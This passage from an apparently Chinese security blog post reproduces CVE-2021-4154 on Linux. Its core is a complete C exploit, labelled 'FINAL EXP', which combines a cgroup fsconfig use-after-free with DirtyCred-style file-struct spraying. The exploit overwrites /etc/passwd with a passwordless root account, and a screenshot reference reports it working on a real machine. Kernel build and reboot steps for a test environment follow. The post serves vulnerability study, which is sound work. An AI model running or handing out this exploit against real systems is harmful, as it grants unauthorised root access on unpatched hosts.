+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISLNK(m)	(((m) &amp; S_IFMT) == S_IFLNK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISREG(m)	(((m) &amp; S_IFMT) == S_IFREG)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISDIR(m)	(((m) &amp; S_IFMT) == S_IFDIR)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISCHR(m)	(((m) &amp; S_IFMT) == S_IFCHR)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISBLK(m)	(((m) &amp; S_IFMT) == S_IFBLK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISFIFO(m)	(((m) &amp; S_IFMT) == S_IFIFO)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISSOCK(m)	(((m) &amp; S_IFMT) == S_IFSOCK)</span><br><span class="hljs-comment">//S_ISLNK(st_mode)：是否是一个连接</span><br><span class="hljs-comment">//S_ISREG(st_mode)：是否是一个常规文件</span><br><span class="hljs-comment">//S_ISDIR(st_mode)：是否是一个目录</span><br><span class="hljs-comment">//S_ISCHR(st_mode)：是否是一个字符设备</span><br><span class="hljs-comment">//S_ISBLK(st_mode)：是否是一个块设备</span><br><span class="hljs-comment">//S_ISFIFO(st_mode)：是否 是一个FIFO文件.</span><br><span class="hljs-comment">//S_ISSOCK(st_mode)：是否是一个SOCKET文件</span><br></code></pre></td></tr></table></figure>
+
+<p>所以只要我们打开的文件不是目录或者常规文件就可以规避掉这个锁</p>
+<h2 id="FINAL-EXP"><a href="#FINAL-EXP" class="headerlink" title="FINAL EXP"></a>FINAL EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kcmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;crypt.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILE_NUM 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_NUM 0x40000</span><br><br><span class="hljs-type">int</span> tmp_fd, uaf_fd, fscontext_fd, victim_fd;<br><span class="hljs-type">int</span> target_fd[FILE_NUM];<br><span class="hljs-type">pid_t</span> fork_fd;<br><span class="hljs-type">pthread_t</span> large_write_thread, passwd_write_thread;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>, large_write_flag = <span class="hljs-number">0</span>, passwd_write_flag;<br><span class="hljs-type">size_t</span> start_addr = <span class="hljs-number">0x114514000</span>;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_namespace</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buff[<span class="hljs-number">0x100</span>];<br><br>    <span class="hljs-type">uid_t</span> uid = getuid();<br>    <span class="hljs-type">gid_t</span> gid = getgid();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] init namespace&quot;</span>);<br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER | CLONE_NEWNS)) &#123;<br>        err_exit(<span class="hljs-string">&quot;unshare(CLONE_NEWUSER | CLONE_NEWNS)&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET)) &#123;<br>        err_exit(<span class="hljs-string">&quot;unshare(CLONE_NEWNET)&quot;</span>);<br>    &#125;<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;deny&quot;</span>);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;0 %d 1&quot;</span>, uid);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;0 %d 1&quot;</span>, gid);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_dir</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] create exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;rm -rf exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;mkdir exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;touch exp_dir/data&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod -R 777 exp_dir/&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_uaf</span><span class="hljs-params">()</span><br>&#123;   <br>    system(<span class="hljs-string">&quot;cd exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;ln -s data exp_dir/uaf&quot;</span>);<br>    system(<span class="hljs-string">&quot;cd ../&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] prepare create uaf&quot;</span>);<br>    fscontext_fd = syscall(__NR_fsopen, <span class="hljs-string">&quot;cgroup&quot;</span>, FSOPEN_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (fscontext_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;fsopen failed!&quot;</span>);<br><br>    uaf_fd = open(<span class="hljs-string">&quot;exp_dir/uaf&quot;</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (uaf_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open uaf failed!&quot;</span>);<br>    <br>    syscall(__NR_fsconfig, fscontext_fd, FSCONFIG_SET_FD, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-literal">NULL</span>, uaf_fd);<br>    close(fscontext_fd);<br>&#125;<br><br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">large_write</span><span class="hljs-params">()</span><br>&#123;<br>    tmp_fd = open(<span class="hljs-string">&quot;exp_dir/uaf&quot;</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (tmp_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open tmp failed!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] mmap 1G size data&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PAGE_NUM; i++)<br>    &#123;<br>        <span class="hljs-type">void</span> * ret = mmap((<span class="hljs-type">void</span>*)start_addr + <span class="hljs-number">0x1000</span>*i , <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!ret)<br>            err_exit(<span class="hljs-string">&quot;mmap failed!&quot;</span>);<br>    &#125;<br>    <br>    large_write_flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (write(tmp_fd, start_addr, <span class="hljs-number">0x1000</span>*(PAGE_NUM<span class="hljs-number">-1</span>)) &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;large write failed!&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] large write success!&quot;</span>);<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">passwd_write</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> passwd[<span class="hljs-number">1024</span>] = <span class="hljs-string">&quot;shell::0:0:root:/root:/bin/bash\n&quot;</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] try to overwrite /etc/passwd&quot;</span>);<br>    <span class="hljs-keyword">while</span> (!large_write_flag) &#123;&#125;<br><br>    passwd_write_flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (write(uaf_fd, passwd, <span class="hljs-built_in">strlen</span>(passwd)) &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;overwrite /etc/passwd failed!&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite /etc/passwd success&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">file_struct_spray</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (!passwd_write_flag) &#123;&#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start try to hit uaf file struct&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FILE_NUM; i++)<br>    &#123;<br>        target_fd[i] = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span> (target_fd[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed at %d target file\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;failed!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, target_fd[i]) == <span class="hljs-number">0</span>)<br>        &#123;<br>            victim_fd = target_fd[i];<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] victim_fd is %d\n&quot;</span>, victim_fd);<br>            flag = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)<br>                close(target_fd[i]);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!flag)<br>        err_exit(<span class="hljs-string">&quot;failed to find victim_fd&quot;</span>);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;   <br><br>    init_namespace();<br>    create_dir();<br>    <br>    create_uaf();<br><br>    pthread_create(&amp;large_write_thread, <span class="hljs-literal">NULL</span>, large_write, <span class="hljs-literal">NULL</span>);<br>    usleep(<span class="hljs-number">1</span>);<br>    pthread_create(&amp;passwd_write_thread, <span class="hljs-literal">NULL</span>, passwd_write, <span class="hljs-literal">NULL</span>);<br><br>    file_struct_spray();<br><br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最终在真机中的运行效果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405192649.png" srcset="/img/loading.gif" lazyload></p>
+<p><del>不用泄露地址，真的就像🐍出来一样爽啊</del></p>
+<h1 id="some-thricks"><a href="#some-thricks" class="headerlink" title="some thricks"></a>some thricks</h1><p>虽然笔者在上一篇文章中提了一种比较方便的替换复现环境内核的方法，但是吧，还是会遇到许多问题。</p>
+<p>就像笔者这次试了5.4和5.8的五六个generic版本，要么就是patch了CVE，要么就是不能稳定运行（大概十次只能成功一次，而且有时候覆写的data一变就8行了）所以笔者还是回归了最原始的方法，直接本地编译一个替换</p>
+<p>先把源码放到&#x2F;usr&#x2F;src下，解压</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> ~/linux-5.8.tar.gz /usr/src<br><span class="hljs-built_in">cd</span> /usr/src<br>tar -xf ./linux-5.8.tar.gz<br><span class="hljs-built_in">cd</span> ./linux-5.8<br></code></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make menuconfig	<span class="hljs-comment">#默认选项，直接退出就行</span><br>make all -j8    <span class="hljs-comment">#时间可能会比较长</span><br></code></pre></td></tr></table></figure>
+
+<p>编译模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make INSTALL_MOD_STRIP=1 modules_install <span class="hljs-comment">#也可以不加INSTALL_MOD_STRIP=1，但是鼠鼠不能保证启动地时候加载600多MB的inid不会卡死呦😋</span><br>make install<br></code></pre></td></tr></table></figure>
+
+<p>更新gurb并重启</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">update-grub<br>reboot<br></code></pre></td></tr></table></figure>
+
+<p>然后就是进入高级模式选择5.8版本的内核启动啦</p>
+<h1 id="0xff：写在最后的最后"><a href="#0xff：写在最后的最后" class="headerlink" title="0xff：写在最后的最后"></a>0xff：写在最后的最后</h1><p>笔者为了图省事，在最后用了<code>dirtycred</code>完成了提权</p>
+<p>但是作为一个21年的CVE，原本的exp其实采用了<strong>CROSS-CACHE OVERFLOW</strong>这一手法完成利用</p>
+<p>主要是铸币笔者实在不是很用的明白<strong>CROSS-CHACHE OVERFLOW</strong>，所以直接逃课了😋</p>
+<p>但估计接下来笔者会写个专题专门练练👊👊👊</p>
+<h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2023/05/19/230518-cve-2021-4154">https://blingblingxuanxuan.github.io/2023/05/19/230518-cve-2021-4154</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/93592262">新一代mount系统调用(1)——接口初探 - 知乎 (zhihu.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OS/" class="print-no-link">#OS</a>
+      
+        <a href="/tags/linux/" class="print-no-link">#linux</a>
+      
+        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
+      
+        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CVE-2021-4154 Remake</div>
+      <div>http://example.com/2024/03/28/dirtycred/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>korey0sh1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/18/dirtypipe/" title="CVE-2022-0847（Dirty Pipe) Remake">
+                        <span class="hidden-mobile">CVE-2022-0847（Dirty Pipe) Remake</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP证123456号
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>京公网安备12345678号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
